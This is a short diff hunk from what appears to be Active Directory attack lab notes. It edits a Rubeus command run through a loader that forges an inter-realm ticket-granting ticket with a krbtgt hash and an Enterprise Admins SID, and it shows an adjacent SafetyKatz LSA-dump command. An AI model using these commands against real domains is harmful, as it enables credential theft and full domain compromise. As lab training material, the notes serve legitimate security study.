@@ -17,7 +17,7 @@ C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::lsa /p
 
 Forge inter-realm TGT
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f03c20c4974d6f6426f4f3c9b4487549 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f03c20c4974d6f6426f4f3c9b4487549 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
 ```
 
 | Option              | Description                                                 |
